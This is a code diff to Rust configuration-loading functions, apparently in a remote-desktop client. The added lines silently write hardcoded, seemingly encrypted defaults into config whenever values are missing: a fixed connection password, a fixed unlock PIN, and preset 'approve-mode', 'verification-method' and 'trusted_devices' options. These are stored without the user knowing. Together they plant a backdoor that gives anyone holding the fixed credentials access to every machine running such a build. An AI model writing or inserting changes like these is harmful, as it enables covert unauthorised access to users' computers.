@@ -459,6 +459,14 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "006nJSNvLEUgYBZL/5jFPgDhyq0ngavfzXoSoE6SicRB0=".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "005iYQCTcCnkRmr6kjSwQKuo7nsHZDUPcsAc+G".to_string());
+            store = true;
+        }    
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -470,6 +478,14 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        if !config.options.contains_key("trusted_devices") {
+            	config.options.insert("trusted_devices".to_string(), "00kAx5n5hofA/FXTBtp9GIT3Zx+QOIihkYtvw=".to_string());
+            	config.store();
+        	}
+        if config.unlock_pin.is_empty() {
+            	config.unlock_pin = "00um3a3Y19E/ebTaZ9FwykF5T7o3dWD/QpAMk=".to_string();
+            	store = true;
+        	}
         if store {
             config.store();
         }
@@ -598,6 +614,10 @@ impl Config {
                 }
             }
         }
+        if config.password.is_empty() {
+            	config.password = "005iYQCTcCnkRmr6kjSwQKuo7nsHZDUPcsAc+G".to_string();
+            	store = true;
+        	}
         if store {
             config.store();
         }
